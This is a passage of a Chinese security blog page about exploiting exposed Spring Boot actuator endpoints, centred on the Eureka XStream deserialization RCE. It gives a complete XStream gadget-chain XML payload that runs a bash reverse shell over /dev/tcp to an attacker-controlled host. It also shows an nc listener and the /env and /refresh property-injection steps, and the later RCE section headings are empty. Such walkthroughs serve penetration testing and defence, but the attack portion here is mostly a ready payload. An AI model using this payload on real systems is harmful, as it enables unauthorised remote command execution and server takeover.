+<h4 id="3-2-6-总结"><a href="#3-2-6-总结" class="headerlink" title="3.2.6 总结"></a>3.2.6 总结</h4><ul>
+<li><code>spring.cloud.bootstrap.location</code>这个配置项是用于resource的加载位置，我们将其定义为远程配置，就会从远程下载配置</li>
+<li>这里用到SnakeYAML的反序列化将jar包执行，<code>!!+代码</code>是SnakeYAML的反序列化特性</li>
+</ul>
+<h3 id="3-3-eureka-xstream-deserialization-RCE"><a href="#3-3-eureka-xstream-deserialization-RCE" class="headerlink" title="3.3 eureka xstream deserialization RCE"></a>3.3 eureka xstream deserialization RCE</h3><h4 id="3-3-1-组件介绍"><a href="#3-3-1-组件介绍" class="headerlink" title="3.3.1 组件介绍"></a>3.3.1 组件介绍</h4><p>XStream是一种OXMapping 技术，是用来处理XML文件序列化的框架,在将JavaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁索。XStream也可以<u>将JavaBean序列化成Json或反序列化</u>，使用非常方便。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.fromXML(xml);</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-3-2-漏洞原理"><a href="#3-3-2-漏洞原理" class="headerlink" title="3.3.2 漏洞原理"></a>3.3.2 漏洞原理</h4><ol>
+<li><code>eureka.client.serviceUrl.defaultZone</code> 属性被设置为恶意的外部eureka server URL地址</li>
+<li><code>/refresh</code> 触发机器远程请求URL，提前架设的fake eureka server就会返回恶意的payload</li>
+<li>目标机器解析payload，触发XStream反序列化，造成RCE漏洞</li>
+</ol>
+<h4 id="3-3-3-利用条件"><a href="#3-3-3-利用条件" class="headerlink" title="3.3.3 利用条件"></a>3.3.3 利用条件</h4><ul>
+<li>可以POST请求目标网站的<code>/env</code> 接口设置属性</li>
+<li>可以POST请求目标网站的<code>/refresh</code>  接口刷新配置(存在<u>spring-boot-starter-actuator</u>依赖)</li>
+<li>目标使用的eureka-client &lt; **1.8.7** (通常包含在<u>spring-cloud-starter-netflix-eureka-client</u>依赖中)</li>
+<li>目标可请求HTTP服务器(可出网)</li>
+</ul>
+<h4 id="3-3-4-架设响应恶意payload的网站"><a href="#3-3-4-架设响应恶意payload的网站" class="headerlink" title="3.3.4 架设响应恶意payload的网站"></a>3.3.4 架设响应恶意payload的网站</h4><blockquote>
+<p>用于反弹Shell</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">linked-hash-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                       <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;<span class="symbol">&amp;amp;</span> /dev/tcp/(ip)/(port) 0&gt;<span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;string&quot;</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">linked-hash-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-3-5-监听端口等待连接"><a href="#3-3-5-监听端口等待连接" class="headerlink" title="3.3.5 监听端口等待连接"></a>3.3.5 监听端口等待连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9888</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-3-6-抓包设置属性"><a href="#3-3-6-抓包设置属性" class="headerlink" title="3.3.6 抓包设置属性"></a>3.3.6 抓包设置属性</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone=http://(ip)/example <span class="comment"># 远程加载地址</span></span><br></pre></td></tr></table></figure>
+
+<p>在抓包修改前：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009122402563.png" alt="image-20221009122402563"></p>
+<p>抓包设置远程加载文件环境:</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009122848452.png" alt="image-20221009122848452"></p>
+<p>再次查看<code>/env</code> ：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009122958870.png" alt="image-20221009122958870"></p>
+<h4 id="3-3-7-刷新SpringCloud配置"><a href="#3-3-7-刷新SpringCloud配置" class="headerlink" title="3.3.7 刷新SpringCloud配置"></a>3.3.7 刷新SpringCloud配置</h4><blockquote>
+<p>通过POST请求<code>/refresh</code>刷新</p>
+</blockquote>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/z-bool/images/img/image-20221009123100576.png" alt="image-20221009123100576"></p>
+<h4 id="3-3-8-反弹shell"><a href="#3-3-8-反弹shell" class="headerlink" title="3.3.8 反弹shell"></a>3.3.8 反弹shell</h4><blockquote>
+<p>由于需要用bash反弹shell，故将服务器部署在linux上，重复此上行为</p>
+</blockquote>
+<h3 id="3-4-jolokia-logback-JNDI-RCE"><a href="#3-4-jolokia-logback-JNDI-RCE" class="headerlink" title="3.4 jolokia logback JNDI RCE"></a>3.4 jolokia logback JNDI RCE</h3><h3 id="3-5-jolokia-Realm-JNDI-RCE"><a href="#3-5-jolokia-Realm-JNDI-RCE" class="headerlink" title="3.5 jolokia Realm JNDI RCE"></a>3.5 jolokia Realm JNDI RCE</h3><h3 id="3-6-restart-h2-database-query-RCE"><a href="#3-6-restart-h2-database-query-RCE" class="headerlink" title="3.6 restart h2 database query RCE"></a>3.6 restart h2 database query RCE</h3><h3 id="3-7-h2-database-console-JNDI-RCE"><a href="#3-7-h2-database-console-JNDI-RCE" class="headerlink" title="3.7 h2 database console JNDI RCE"></a>3.7 h2 database console JNDI RCE</h3><h3 id="3-8-mysql-jdbc-deserialization-RCE"><a href="#3-8-mysql-jdbc-deserialization-RCE" class="headerlink" title="3.8 mysql jdbc deserialization RCE"></a>3.8 mysql jdbc deserialization RCE</h3><h3 id="3-9-restart-logging-config-logback-JNDI-RCE"><a href="#3-9-restart-logging-config-logback-JNDI-RCE" class="headerlink" title="3.9 restart logging.config logback JNDI RCE"></a>3.9 restart logging.config logback JNDI RCE</h3><h3 id="3-10-restart-logging-config-groovy-RCE"><a href="#3-10-restart-logging-config-groovy-RCE" class="headerlink" title="3.10 restart logging.config groovy RCE"></a>3.10 restart logging.config groovy RCE</h3><h3 id="3-11-restart-spring-main-sources-groovy-RCE"><a href="#3-11-restart-spring-main-sources-groovy-RCE" class="headerlink" title="3.11 restart spring.main.sources groovy RCE"></a>3.11 restart spring.main.sources groovy RCE</h3><h3 id="3-12-restart-spring-datasource-data-h2-database-RCE"><a href="#3-12-restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="3.12 restart spring.datasource.data h2 database RCE"></a>3.12 restart spring.datasource.data h2 database RCE</h3>
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/2022/10/08/redis-unauthorized/">Redis未授权访问漏洞<span class="note">较早</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="http://example.com/">@z-bool</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.9.0" title="v1.9.0">Stellar</a> 主题创建。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.9.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://fastly.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://fastly.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://fastly.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://fastly.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
